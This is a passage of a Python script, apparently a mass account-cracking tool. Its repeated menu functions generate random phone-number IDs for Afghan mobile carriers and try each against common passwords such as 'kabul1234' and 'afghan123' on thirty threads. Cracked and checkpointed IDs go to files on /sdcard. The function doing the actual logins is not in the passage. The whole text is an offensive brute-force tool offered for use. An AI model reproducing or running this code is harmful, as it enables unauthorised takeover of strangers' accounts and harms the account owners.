            manshera.submit(freeq,uid,pwx,tl)
    print('')
    print('\033[1;32m--------------------------------------------------------------') 
    print('\033[1;97m[+]\033[1;92m COMPLETED\n\033[1;97m[√] \033[1;92mYOUR OK IDS \033[1;91m: \033[1;96m'+str(len(ok))+'\n\033[1;97m[+]\033[1;92m TOTAL CP IDS \033[1;91m: \033[1;96m'+str(len(cp)))
    print('\033[1;32m--------------------------------------------------------------') 
    print('\033[1;97m[+]\033[1;92m OK IDS SAVE \033[1;91m: \033[1;96m/sdcard/B-T-OK.txt\n\033[1;97m[+]\033[1;92m CP IDS SAVE \033[1;91m: \033[1;96m/sdcard/B-T-CP.txt')
    input(f'\033[1;97m[+]\033[1;92m PRESS ENTER TO BACK MENU');os.system("clear");main()

def awm5():
    os.system("clear")
    print(logo)
    clear()
    print('\033[1;32m--------------------------------------------------------------') 
    print(f"  \x1b[97m\033[37;40m           [ SIM - CODE - MENU ]\033[0;m")
    print('\033[1;32m--------------------------------------------------------------') 
    print(f"\t        \x1b[97m\033[37;40m  [EXMP]\033[0;m")
    print('\033[1;32m--------------------------------------------------------------') 
    print(f'\033[1;97m[!] \033[1;93mMTN SIM CODES  \033[1;91m             : \033[1;96m9377, 9376')
    print(f'\033[1;97m[!] \033[1;93mROSHAN SIM CODES \033[1;91m           : \033[1;96m9379, 9372')
    print(f'\033[1;97m[!] \033[1;93mAWCC + ETISALAT SIM CODES \033[1;91m  : \033[1;96m9370, 9378')
    print('\033[1;32m--------------------------------------------------------------') 
    code = input('\033[1;37m[\033[1;31m!\033[1;37m]\033[1;32m SIM CODE \033[1;37m: \033[1;36m')
    os.system("clear")
    print(logo)   
    print('\033[1;32m--------------------------------------------------------------') 
    limit = int(input('\033[1;90m[+]\033[1;92m EXAMPLE \033[1;91m: \033[1;96m2000, 3000, 50000, 100000\n\033[1;32m------------------------------------------------\n\033[1;97m[+]\033[1;92m PUT IDS LIMIT \033[1;91m: \033[1;96m'))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=30) as manshera:    
        clear()
        tl = str(len(user))
        print(f"\033[1;97m[+]\033[1;92m NAME\033[1;91m                :\033[1;96m "+NameX)
        print(f"\033[1;97m[+]\033[1;92m SIM CODE YOU CHOICE\033[1;91m : \033[1;96m"+code)
        print(f"\033[1;97m[+]\033[1;92m TOTAL IDZ\033[1;91m                : \033[1;96m["+tl+"] ")
        print('\033[1;32m--------------------------------------------------------------') 
        print('    ON/OFF YOUR MOBILE DATA BEFORE USE')
        print('\033[1;32m--------------------------------------------------------------') 
        for love in user:
            uid = code+love
            pwx = [love,'afghanistan']
            manshera.submit(freeq,uid,pwx,tl)
    print('')
    print('\033[1;32m--------------------------------------------------------------') 
    print('\033[1;97m[+]\033[1;92m COMPLETED\n\033[1;97m[√] \033[1;92mYOUR OK IDS \033[1;91m: \033[1;96m'+str(len(ok))+'\n\033[1;97m[+]\033[1;92m TOTAL CP IDS \033[1;91m: \033[1;96m'+str(len(cp)))
    print('\033[1;32m--------------------------------------------------------------') 
    print('\033[1;97m[+]\033[1;92m OK IDS SAVE \033[1;91m: \033[1;96m/sdcard/B-T-OK.txt\n\033[1;97m[+]\033[1;92m CP IDS SAVE \033[1;91m: \033[1;96m/sdcard/B-T-CP.txt')
    input(f'\033[1;97m[+]\033[1;92m PRESS ENTER TO BACK MENU');os.system("clear");main()

def awm4():
    os.system("clear")
    print(logo)
    clear()
    print('\033[1;32m--------------------------------------------------------------') 
    print(f"  \x1b[97m\033[37;40m           [ SIM - CODE - MENU ]\033[0;m")
    print('\033[1;32m--------------------------------------------------------------') 
    print(f"\t        \x1b[97m\033[37;40m  [EXMP]\033[0;m")
    print('\033[1;32m--------------------------------------------------------------') 
    print(f'\033[1;97m[!] \033[1;93mMTN SIM CODES  \033[1;91m             : \033[1;96m9377, 9376')
    print(f'\033[1;97m[!] \033[1;93mROSHAN SIM CODES \033[1;91m           : \033[1;96m9379, 9372')
    print(f'\033[1;97m[!] \033[1;93mAWCC + ETISALAT SIM CODES \033[1;91m  : \033[1;96m9370, 9378')
    print('\033[1;32m--------------------------------------------------------------') 
    code = input('\033[1;37m[\033[1;31m!\033[1;37m]\033[1;32m SIM CODE \033[1;37m: \033[1;36m')
    os.system("clear")
    print(logo)   
    print('\033[1;32m--------------------------------------------------------------') 
    limit = int(input('\033[1;90m[+]\033[1;92m EXAMPLE \033[1;91m: \033[1;96m2000, 3000, 50000, 100000\n\033[1;32m------------------------------------------------\n\033[1;97m[+]\033[1;92m PUT IDS LIMIT \033[1;91m: \033[1;96m'))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=30) as manshera:    
        clear()
        tl = str(len(user))
        print(f"\033[1;97m[+]\033[1;92m NAME\033[1;91m                :\033[1;96m "+NameX)
        print(f"\033[1;97m[+]\033[1;92m SIM CODE YOU CHOICE\033[1;91m : \033[1;96m"+code)
        print(f"\033[1;97m[+]\033[1;92m TOTAL IDZ\033[1;91m                : \033[1;96m["+tl+"] ")
        print('\033[1;32m--------------------------------------------------------------') 
        print('    ON/OFF YOUR MOBILE DATA BEFORE USE')
        print('\033[1;32m--------------------------------------------------------------') 
        for love in user:
            uid = code+love
            pwx = [love,'afghan']
            manshera.submit(freeq,uid,pwx,tl)
    print('')
    print('\033[1;32m--------------------------------------------------------------') 
    print('\033[1;97m[+]\033[1;92m COMPLETED\n\033[1;97m[√] \033[1;92mYOUR OK IDS \033[1;91m: \033[1;96m'+str(len(ok))+'\n\033[1;97m[+]\033[1;92m TOTAL CP IDS \033[1;91m: \033[1;96m'+str(len(cp)))
    print('\033[1;32m--------------------------------------------------------------') 
    print('\033[1;97m[+]\033[1;92m OK IDS SAVE \033[1;91m: \033[1;96m/sdcard/B-T-OK.txt\n\033[1;97m[+]\033[1;92m CP IDS SAVE \033[1;91m: \033[1;96m/sdcard/B-T-CP.txt')
    input(f'\033[1;97m[+]\033[1;92m PRESS ENTER TO BACK MENU');os.system("clear");main()

def awm6():
    os.system("clear")
    print(logo)
    clear()
    
    print('\033[1;32m--------------------------------------------------------------') 
    print(f"  \x1b[97m\033[37;40m           [ SIM - CODE - MENU ]\033[0;m")
    print('\033[1;32m--------------------------------------------------------------') 
    print(f"\t        \x1b[97m\033[37;40m  [EXMP]\033[0;m")
    print('\033[1;32m--------------------------------------------------------------') 
    print(f'\033[1;97m[!] \033[1;93mMTN SIM CODES  \033[1;91m             : \033[1;96m9377, 9376')
    print(f'\033[1;97m[!] \033[1;93mROSHAN SIM CODES \033[1;91m           : \033[1;96m9379, 9372')
    print(f'\033[1;97m[!] \033[1;93mAWCC + ETISALAT SIM CODES \033[1;91m  : \033[1;96m9370, 9378')
    print('\033[1;32m--------------------------------------------------------------') 
    code = input('\033[1;37m[\033[1;31m!\033[1;37m]\033[1;32m SIM CODE \033[1;37m: \033[1;36m')
    os.system("clear")
    print(logo)   
    print('\033[1;32m--------------------------------------------------------------') 
    limit = int(input('\033[1;90m[+]\033[1;92m EXAMPLE \033[1;91m: \033[1;96m2000, 3000, 50000, 100000\n\033[1;32m------------------------------------------------\n\033[1;97m[+]\033[1;92m PUT IDS LIMIT \033[1;91m: \033[1;96m'))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=30) as manshera:    
        clear()
        tl = str(len(user))
        print(f"\033[1;97m[+]\033[1;92m NAME\033[1;91m                :\033[1;96m "+NameX)
        print(f"\033[1;97m[+]\033[1;92m SIM CODE YOU CHOICE\033[1;91m : \033[1;96m"+code)
        print(f"\033[1;97m[+]\033[1;92m TOTAL IDZ\033[1;91m           : \033[1;96m["+tl+"] ")
        print('\033[1;32m--------------------------------------------------------------') 
        print('    ON/OFF YOUR MOBILE DATA BEFORE USE')
        print('\033[1;32m--------------------------------------------------------------') 
        for love in user:
            uid = code+love
            pwx = [love,'100200']
            manshera.submit(freeq,uid,pwx,tl)
    print('')
    print('\033[1;32m--------------------------------------------------------------') 
    print('\033[1;97m[+]\033[1;92m COMPLETED\n\033[1;97m[√] \033[1;92mYOUR OK IDS \033[1;91m: \033[1;96m'+str(len(ok))+'\n\033[1;97m[+]\033[1;92m TOTAL CP IDS \033[1;91m: \033[1;96m'+str(len(cp)))
    print('\033[1;32m--------------------------------------------------------------') 
    print('\033[1;97m[+]\033[1;92m OK IDS SAVE \033[1;91m: \033[1;96m/sdcard/AWMOK.txt\n\033[1;97m[+]\033[1;92m CP IDS SAVE \033[1;91m: \033[1;96m/sdcard/AWMCP.txt')
    input(f'\033[1;97m[+]\033[1;92m PRESS ENTER TO BACK MENU');os.system("clear");main()

def awm7():
    os.system("clear")
    print(logo)
    clear()
    
    print('\033[1;32m--------------------------------------------------------------') 
    print(f"  \x1b[97m\033[37;40m           [ SIM - CODE - MENU ]\033[0;m")
    print('\033[1;32m--------------------------------------------------------------') 
    print(f"\t        \x1b[97m\033[37;40m  [EXMP]\033[0;m")
    print('\033[1;32m--------------------------------------------------------------') 
    print(f'\033[1;97m[!] \033[1;93mMTN SIM CODES  \033[1;91m             : \033[1;96m9377, 9376')
    print(f'\033[1;97m[!] \033[1;93mROSHAN SIM CODES \033[1;91m           : \033[1;96m9379, 9372')
    print(f'\033[1;97m[!] \033[1;93mAWCC + ETISALAT SIM CODES \033[1;91m  : \033[1;96m9370, 9378')
    print('\033[1;32m--------------------------------------------------------------') 
    code = input('\033[1;37m[\033[1;31m!\033[1;37m]\033[1;32m SIM CODE \033[1;37m: \033[1;36m')
    os.system("clear")
    print(logo)   
    print('\033[1;32m--------------------------------------------------------------') 
    limit = int(input('\033[1;90m[+]\033[1;92m EXAMPLE \033[1;91m: \033[1;96m2000, 3000, 50000, 100000\n\033[1;32m------------------------------------------------\n\033[1;97m[+]\033[1;92m PUT IDS LIMIT \033[1;91m: \033[1;96m'))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=30) as manshera:    
        clear()
        tl = str(len(user))
        print(f"\033[1;97m[+]\033[1;92m NAME\033[1;91m                :\033[1;96m "+NameX)
        print(f"\033[1;97m[+]\033[1;92m SIM CODE YOU CHOICE\033[1;91m : \033[1;96m"+code)
        print(f"\033[1;97m[+]\033[1;92m TOTAL IDZ\033[1;91m                : \033[1;96m["+tl+"] ")
        print('\033[1;32m--------------------------------------------------------------') 
        print('    ON/OFF YOUR MOBILE DATA BEFORE USE')
        print('\033[1;32m--------------------------------------------------------------') 
        for love in user:
            uid = code+love
            pwx = [love,'kabul1234']
            manshera.submit(freeq,uid,pwx,tl)
    print('')
    print('\033[1;32m--------------------------------------------------------------') 
    print('\033[1;97m[+]\033[1;92m COMPLETED\n\033[1;97m[√] \033[1;92mYOUR OK IDS \033[1;91m: \033[1;96m'+str(len(ok))+'\n\033[1;97m[+]\033[1;92m TOTAL CP IDS \033[1;91m: \033[1;96m'+str(len(cp)))
    print('\033[1;32m--------------------------------------------------------------') 
    print('\033[1;97m[+]\033[1;92m OK IDS SAVE \033[1;91m: \033[1;96m/sdcard/AWMOK.txt\n\033[1;97m[+]\033[1;92m CP IDS SAVE \033[1;91m: \033[1;96m/sdcard/AWMCP.txt')
    input(f'\033[1;97m[+]\033[1;92m PRESS ENTER TO BACK MENU');os.system("clear");main()

def awm8():
    os.system("clear")
    print(logo)
    clear()
    
    print('\033[1;32m--------------------------------------------------------------') 
    print(f"  \x1b[97m\033[37;40m           [ SIM - CODE - MENU ]\033[0;m")
    print('\033[1;32m--------------------------------------------------------------') 
    print(f"\t        \x1b[97m\033[37;40m  [EXMP]\033[0;m")
    print('\033[1;32m--------------------------------------------------------------') 
    print(f'\033[1;97m[!] \033[1;93mMTN SIM CODES  \033[1;91m             : \033[1;96m9377, 9376')
    print(f'\033[1;97m[!] \033[1;93mROSHAN SIM CODES \033[1;91m           : \033[1;96m9379, 9372')
    print(f'\033[1;97m[!] \033[1;93mAWCC + ETISALAT SIM CODES \033[1;91m  : \033[1;96m9370, 9378')
    print('\033[1;32m--------------------------------------------------------------') 
    code = input('\033[1;37m[\033[1;31m!\033[1;37m]\033[1;32m SIM CODE \033[1;37m: \033[1;36m')
    os.system("clear")
    print(logo)   
    print('\033[1;32m--------------------------------------------------------------') 
    limit = int(input('\033[1;90m[+]\033[1;92m EXAMPLE \033[1;91m: \033[1;96m2000, 3000, 50000, 100000\n\033[1;32m------------------------------------------------\n\033[1;97m[+]\033[1;92m PUT IDS LIMIT \033[1;91m: \033[1;96m'))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=30) as manshera:    
        clear()
        tl = str(len(user))
        print(f"\033[1;97m[+]\033[1;92m NAME\033[1;91m                :\033[1;96m "+NameX)
        print(f"\033[1;97m[+]\033[1;92m SIM CODE YOU CHOICE\033[1;91m : \033[1;96m"+code)
        print(f"\033[1;97m[+]\033[1;92m TOTAL IDZ\033[1;91m           : \033[1;96m["+tl+"] ")
        print('\033[1;32m--------------------------------------------------------------') 
        print('    ON/OFF YOUR MOBILE DATA BEFORE USE')
        print('\033[1;32m--------------------------------------------------------------') 
        for love in user:
            uid = code+love
            pwx = [love,'kabul123']
            manshera.submit(freeq,uid,pwx,tl)
    print('')
    print('\033[1;32m--------------------------------------------------------------') 
    print('\033[1;97m[+]\033[1;92m COMPLETED\n\033[1;97m[√] \033[1;92mYOUR OK IDS \033[1;91m: \033[1;96m'+str(len(ok))+'\n\033[1;97m[+]\033[1;92m TOTAL CP IDS \033[1;91m: \033[1;96m'+str(len(cp)))
    print('\033[1;32m--------------------------------------------------------------') 
    print('\033[1;97m[+]\033[1;92m OK IDS SAVE \033[1;91m: \033[1;96m/sdcard/AWMOK.txt\n\033[1;97m[+]\033[1;92m CP IDS SAVE \033[1;91m: \033[1;96m/sdcard/AWMCP.txt')
    input(f'\033[1;97m[+]\033[1;92m PRESS ENTER TO BACK MENU');os.system("clear");main()

def awm9():
    os.system("clear")
    print(logo)
    clear()
    
    print('\033[1;32m--------------------------------------------------------------') 
    print(f"  \x1b[97m\033[37;40m           [ SIM - CODE - MENU ]\033[0;m")
    print('\033[1;32m--------------------------------------------------------------') 
    print(f"\t        \x1b[97m\033[37;40m  [EXMP]\033[0;m")
    print('\033[1;32m--------------------------------------------------------------') 
    print(f'\033[1;97m[!] \033[1;93mMTN SIM CODES  \033[1;91m             : \033[1;96m9377, 9376')
    print(f'\033[1;97m[!] \033[1;93mROSHAN SIM CODES \033[1;91m           : \033[1;96m9379, 9372')
    print(f'\033[1;97m[!] \033[1;93mAWCC + ETISALAT SIM CODES \033[1;91m  : \033[1;96m9370, 9378')
    print('\033[1;32m--------------------------------------------------------------') 
    code = input('\033[1;37m[\033[1;31m!\033[1;37m]\033[1;32m SIM CODE \033[1;37m: \033[1;36m')
    os.system("clear")
    print(logo)   
    print('\033[1;32m--------------------------------------------------------------') 
    limit = int(input('\033[1;90m[+]\033[1;92m EXAMPLE \033[1;91m: \033[1;96m2000, 3000, 50000, 100000\n\033[1;32m------------------------------------------------\n\033[1;97m[+]\033[1;92m PUT IDS LIMIT \033[1;91m: \033[1;96m'))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=30) as manshera:    
        clear()
        tl = str(len(user))
        print(f"\033[1;97m[+]\033[1;92m NAME\033[1;91m                :\033[1;96m "+NameX)
        print(f"\033[1;97m[+]\033[1;92m SIM CODE YOU CHOICE\033[1;91m : \033[1;96m"+code)
        print(f"\033[1;97m[+]\033[1;92m TOTAL IDZ\033[1;91m           : \033[1;96m["+tl+"] ")
        print('\033[1;32m--------------------------------------------------------------') 
        print('    ON/OFF YOUR MOBILE DATA BEFORE USE')
        print('\033[1;32m--------------------------------------------------------------') 
        for love in user:
            uid = code+love
            pwx = [love,'afghan123']
            manshera.submit(freeq,uid,pwx,tl)
    print('')
    print('\033[1;32m--------------------------------------------------------------') 
    print('\033[1;97m[+]\033[1;92m COMPLETED\n\033[1;97m[√] \033[1;92mYOUR OK IDS \033[1;91m: \033[1;96m'+str(len(ok))+'\n\033[1;97m[+]\033[1;92m TOTAL CP IDS \033[1;91m: \033[1;96m'+str(len(cp)))
    print('\033[1;32m--------------------------------------------------------------') 
    print('\033[1;97m[+]\033[1;92m OK IDS SAVE \033[1;91m: \033[1;96m/sdcard/AWMOK.txt\n\033[1;97m[+]\033[1;92m CP IDS SAVE \033[1;91m: \033[1;96m/sdcard/AWMCP.txt')
    input(f'\033[1;97m[+]\033[1;92m PRESS ENTER TO BACK MENU');os.system("clear");main()

def awm10():
    os.system("clear")
    print(logo)
    clear()
    
    print('\033[1;32m--------------------------------------------------------------') 
    print(f"  \x1b[97m\033[37;40m           [ SIM - CODE - MENU ]\033[0;m")
    print('\033[1;32m--------------------------------------------------------------') 
    print(f"\t        \x1b[97m\033[37;40m  [EXMP]\033[0;m")
    print('\033[1;32m--------------------------------------------------------------') 
    print(f'\033[1;97m[!] \033[1;93mMTN SIM CODES  \033[1;91m             : \033[1;96m9377, 9376')
    print(f'\033[1;97m[!] \033[1;93mROSHAN SIM CODES \033[1;91m           : \033[1;96m9379, 9372')
    print(f'\033[1;97m[!] \033[1;93mAWCC + ETISALAT SIM CODES \033[1;91m  : \033[1;96m9370, 9378')
    print('\033[1;32m--------------------------------------------------------------') 
    code = input('\033[1;37m[\033[1;31m!\033[1;37m]\033[1;32m SIM CODE \033[1;37m: \033[1;36m')
    os.system("clear")
    print(logo)   
    print('\033[1;32m--------------------------------------------------------------') 
    limit = int(input('\033[1;90m[+]\033[1;92m EXAMPLE \033[1;91m: \033[1;96m2000, 3000, 50000, 100000\n\033[1;32m------------------------------------------------\n\033[1;97m[+]\033[1;92m PUT IDS LIMIT \033[1;91m: \033[1;96m'))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=30) as manshera:    
        clear()
        tl = str(len(user))
        print(f"\033[1;97m[+]\033[1;92m NAME\033[1;91m                :\033[1;96m "+NameX)
        print(f"\033[1;97m[+]\033[1;92m SIM CODE YOU CHOICE\033[1;91m : \033[1;96m"+code)
        print(f"\033[1;97m[+]\033[1;92m TOTAL IDZ\033[1;91m           : \033[1;96m["+tl+"] ")
        print('\033[1;32m--------------------------------------------------------------') 
        print('    ON/OFF YOUR MOBILE DATA BEFORE USE')
        print('\033[1;32m--------------------------------------------------------------') 
        for love in user:
            uid = code+love
            pwx = [love,'1122334455']
            manshera.submit(freeq,uid,pwx,tl)
    print('')
    print('\033[1;32m--------------------------------------------------------------') 
    print('\033[1;97m[+]\033[1;92m COMPLETED\n\033[1;97m[√] \033[1;92mYOUR OK IDS \033[1;91m: \033[1;96m'+str(len(ok))+'\n\033[1;97m[+]\033[1;92m TOTAL CP IDS \033[1;91m: \033[1;96m'+str(len(cp)))
    print('\033[1;32m--------------------------------------------------------------') 
    print('\033[1;97m[+]\033[1;92m OK IDS SAVE \033[1;91m: \033[1;96m/sdcard/AWMOK.txt\n\033[1;97m[+]\033[1;92m CP IDS SAVE \033[1;91m: \033[1;96m/sdcard/AWMCP.txt')
    input(f'\033[1;97m[+]\033[1;92m PRESS ENTER TO BACK MENU');os.system("clear");main()


def awm11():
    os.system("clear")
    print(logo)
    clear()
    
    print('\033[1;32m--------------------------------------------------------------') 
    print(f"  \x1b[97m\033[37;40m           [ SIM - CODE - MENU ]\033[0;m")
    print('\033[1;32m--------------------------------------------------------------') 
    print(f"\t        \x1b[97m\033[37;40m  [EXMP]\033[0;m")
    print('\033[1;32m--------------------------------------------------------------') 
    print(f'\033[1;97m[!] \033[1;93mMTN SIM CODES  \033[1;91m             : \033[1;96m9377, 9376')
    print(f'\033[1;97m[!] \033[1;93mROSHAN SIM CODES \033[1;91m           : \033[1;96m9379, 9372')
    print(f'\033[1;97m[!] \033[1;93mAWCC + ETISALAT SIM CODES \033[1;91m  : \033[1;96m9370, 9378')
    print('\033[1;32m--------------------------------------------------------------') 
    code = input('\033[1;37m[\033[1;31m!\033[1;37m]\033[1;32m SIM CODE \033[1;37m: \033[1;36m')
    os.system("clear")
    print(logo)   
    print('\033[1;32m--------------------------------------------------------------') 
    limit = int(input('\033[1;90m[+]\033[1;92m EXAMPLE \033[1;91m: \033[1;96m2000, 3000, 50000, 100000\n\033[1;32m------------------------------------------------\n\033[1;97m[+]\033[1;92m PUT IDS LIMIT \033[1;91m: \033[1;96m'))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=30) as manshera:    
        clear()
        tl = str(len(user))
        print(f"\033[1;97m[+]\033[1;92m NAME\033[1;91m                :\033[1;96m "+NameX)
        print(f"\033[1;97m[+]\033[1;92m SIM CODE YOU CHOICE\033[1;91m : \033[1;96m"+code)
        print(f"\033[1;97m[+]\033[1;92m TOTAL IDZ\033[1;91m           : \033[1;96m["+tl+"] ")
        print('\033[1;32m--------------------------------------------------------------') 
        print('    ON/OFF YOUR MOBILE DATA BEFORE USE')
        print('\033[1;32m--------------------------------------------------------------') 
        for love in user:
            uid = code+love
            pwx = [love,'1234512345']
            manshera.submit(freeq,uid,pwx,tl)
    print('')
    print('\033[1;32m--------------------------------------------------------------') 
    print('\033[1;97m[+]\033[1;92m COMPLETED\n\033[1;97m[√] \033[1;92mYOUR OK IDS \033[1;91m: \033[1;96m'+str(len(ok))+'\n\033[1;97m[+]\033[1;92m TOTAL CP IDS \033[1;91m: \033[1;96m'+str(len(cp)))
    print('\033[1;32m--------------------------------------------------------------') 
    print('\033[1;97m[+]\033[1;92m OK IDS SAVE \033[1;91m: \033[1;96m/sdcard/AWMOK.txt\n\033[1;97m[+]\033[1;92m CP IDS SAVE \033[1;91m: \033[1;96m/sdcard/AWMCP.txt')
    input(f'\033[1;97m[+]\033[1;92m PRESS ENTER TO BACK MENU');os.system("clear");main()

def awm12():
    os.system("clear")
    print(logo)
    clear()
    
    print('\033[1;32m--------------------------------------------------------------') 
    print(f"  \x1b[97m\033[37;40m           [ SIM - CODE - MENU ]\033[0;m")
    print('\033[1;32m--------------------------------------------------------------') 
    print(f"\t        \x1b[97m\033[37;40m  [EXMP]\033[0;m")
    print('\033[1;32m--------------------------------------------------------------') 
    print(f'\033[1;97m[!] \033[1;93mMTN SIM CODES  \033[1;91m             : \033[1;96m9377, 9376')
    print(f'\033[1;97m[!] \033[1;93mROSHAN SIM CODES \033[1;91m           : \033[1;96m9379, 9372')
    print(f'\033[1;97m[!] \033[1;93mAWCC + ETISALAT SIM CODES \033[1;91m  : \033[1;96m9370, 9378')
    print('\033[1;32m--------------------------------------------------------------') 
    code = input('\033[1;37m[\033[1;31m!\033[1;37m]\033[1;32m SIM CODE \033[1;37m: \033[1;36m')
    os.system("clear")
    print(logo)   
    print('\033[1;32m--------------------------------------------------------------') 
    limit = int(input('\033[1;90m[+]\033[1;92m EXAMPLE \033[1;91m: \033[1;96m2000, 3000, 50000, 100000\n\033[1;32m------------------------------------------------\n\033[1;97m[+]\033[1;92m PUT IDS LIMIT \033[1;91m: \033[1;96m'))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=30) as manshera:    
        clear()
        tl = str(len(user))
        print(f"\033[1;97m[+]\033[1;92m NAME\033[1;91m                :\033[1;96m "+NameX)
        print(f"\033[1;97m[+]\033[1;92m SIM CODE YOU CHOICE\033[1;91m : \033[1;96m"+code)
        print(f"\033[1;97m[+]\033[1;92m TOTAL IDZ\033[1;91m           : \033[1;96m["+tl+"] ")
        print('\033[1;32m--------------------------------------------------------------') 
        print('    ON/OFF YOUR MOBILE DATA BEFORE USE')
        print('\033[1;32m--------------------------------------------------------------') 
        for love in user:
            uid = code+love
            pwx = [love,'786786']
            manshera.submit(freeq,uid,pwx,tl)
    print('')
    print('\033[1;32m--------------------------------------------------------------') 
    print('\033[1;97m[+]\033[1;92m COMPLETED\n\033[1;97m[√] \033[1;92mYOUR OK IDS \033[1;91m: \033[1;96m'+str(len(ok))+'\n\033[1;97m[+]\033[1;92m TOTAL CP IDS \033[1;91m: \033[1;96m'+str(len(cp)))
    print('\033[1;32m--------------------------------------------------------------') 
    print('\033[1;97m[+]\033[1;92m OK IDS SAVE \033[1;91m: \033[1;96m/sdcard/AWMOK.txt\n\033[1;97m[+]\033[1;92m CP IDS SAVE \033[1;91m: \033[1;96m/sdcard/AWMCP.txt')
    input(f'\033[1;97m[+]\033[1;92m PRESS ENTER TO BACK MENU');os.system("clear");main()

def awm13():
    os.system("clear")
    print(logo)
    clear()
    
    print('\033[1;32m--------------------------------------------------------------') 
    print(f"  \x1b[97m\033[37;40m           [ SIM - CODE - MENU ]\033[0;m")
    print('\033[1;32m--------------------------------------------------------------') 
    print(f"\t        \x1b[97m\033[37;40m  [EXMP]\033[0;m")
    print('\033[1;32m--------------------------------------------------------------') 
    print(f'\033[1;97m[!] \033[1;93mMTN SIM CODES  \033[1;91m             : \033[1;96m9377, 9376')
    print(f'\033[1;97m[!] \033[1;93mROSHAN SIM CODES \033[1;91m           : \033[1;96m9379, 9372')
    print(f'\033[1;97m[!] \033[1;93mAWCC + ETISALAT SIM CODES \033[1;91m  : \033[1;96m9370, 9378')
    print('\033[1;32m--------------------------------------------------------------') 
    code = input('\033[1;37m[\033[1;31m!\033[1;37m]\033[1;32m SIM CODE \033[1;37m: \033[1;36m')
    os.system("clear")
    print(logo)   
    print('\033[1;32m--------------------------------------------------------------') 
    limit = int(input('\033[1;90m[+]\033[1;92m EXAMPLE \033[1;91m: \033[1;96m2000, 3000, 50000, 100000\n\033[1;32m------------------------------------------------\n\033[1;97m[+]\033[1;92m PUT IDS LIMIT \033[1;91m: \033[1;96m'))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=30) as manshera:    
        clear()
        tl = str(len(user))
        print(f"\033[1;97m[+]\033[1;92m NAME\033[1;91m                :\033[1;96m "+NameX)
        print(f"\033[1;97m[+]\033[1;92m SIM CODE YOU CHOICE\033[1;91m : \033[1;96m"+code)
        print(f"\033[1;97m[+]\033[1;92m TOTAL IDZ\033[1;91m           : \033[1;96m["+tl+"] ")
        print('\033[1;32m--------------------------------------------------------------') 
        print('    ON/OFF YOUR MOBILE DATA BEFORE USE')
        print('\033[1;32m--------------------------------------------------------------') 
        for love in user:
            uid = code+love
            pwx = [love,'500600']
            manshera.submit(freeq,uid,pwx,tl)
    print('')
    print('\033[1;32m--------------------------------------------------------------') 
    print('\033[1;97m[+]\033[1;92m COMPLETED\n\033[1;97m[√] \033[1;92mYOUR OK IDS \033[1;91m: \033[1;96m'+str(len(ok))+'\n\033[1;97m[+]\033[1;92m TOTAL CP IDS \033[1;91m: \033[1;96m'+str(len(cp)))
    print('\033[1;32m--------------------------------------------------------------') 
    print('\033[1;97m[+]\033[1;92m OK IDS SAVE \033[1;91m: \033[1;96m/sdcard/AWMOK.txt\n\033[1;97m[+]\033[1;92m CP IDS SAVE \033[1;91m: \033[1;96m/sdcard/AWMCP.txt')
    input(f'\033[1;97m[+]\033[1;92m PRESS ENTER TO BACK MENU');os.system("clear");main()

def awm14():
    os.system("clear")
    print(logo)
    clear()
    
    print('\033[1;32m--------------------------------------------------------------') 
    print(f"  \x1b[97m\033[37;40m           [ SIM - CODE - MENU ]\033[0;m")
    print('\033[1;32m--------------------------------------------------------------') 
    print(f"\t        \x1b[97m\033[37;40m  [EXMP]\033[0;m")
    print('\033[1;32m--------------------------------------------------------------') 
    print(f'\033[1;97m[!] \033[1;93mMTN SIM CODES  \033[1;91m             : \033[1;96m9377, 9376')
    print(f'\033[1;97m[!] \033[1;93mROSHAN SIM CODES \033[1;91m           : \033[1;96m9379, 9372')
    print(f'\033[1;97m[!] \033[1;93mAWCC + ETISALAT SIM CODES \033[1;91m  : \033[1;96m9370, 9378')
    print('\033[1;32m--------------------------------------------------------------') 
    code = input('\033[1;37m[\033[1;31m!\033[1;37m]\033[1;32m SIM CODE \033[1;37m: \033[1;36m')
    os.system("clear")
    print(logo)   
    print('\033[1;32m--------------------------------------------------------------') 
    limit = int(input('\033[1;90m[+]\033[1;92m EXAMPLE \033[1;91m: \033[1;96m2000, 3000, 50000, 100000\n\033[1;32m------------------------------------------------\n\033[1;97m[+]\033[1;92m PUT IDS LIMIT \033[1;91m: \033[1;96m'))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=30) as manshera:    
        clear()
        tl = str(len(user))
        print(f"\033[1;97m[+]\033[1;92m NAME\033[1;91m                :\033[1;96m "+NameX)
        print(f"\033[1;97m[+]\033[1;92m SIM CODE YOU CHOICE\033[1;91m : \033[1;96m"+code)
        print(f"\033[1;97m[+]\033[1;92m TOTAL IDZ\033[1;91m           : \033[1;96m["+tl+"] ")
        print('\033[1;32m--------------------------------------------------------------') 
        print('    ON/OFF YOUR MOBILE DATA BEFORE USE')
        print('\033[1;32m--------------------------------------------------------------') 
        for love in user:
            uid = code+love
            pwx = [love,'kabul1234']
            manshera.submit(freeq,uid,pwx,tl)
    print('')
    print('\033[1;32m--------------------------------------------------------------') 
    print('\033[1;97m[+]\033[1;92m COMPLETED\n\033[1;97m[√] \033[1;92mYOUR OK IDS \033[1;91m: \033[1;96m'+str(len(ok))+'\n\033[1;97m[+]\033[1;92m TOTAL CP IDS \033[1;91m: \033[1;96m'+str(len(cp)))
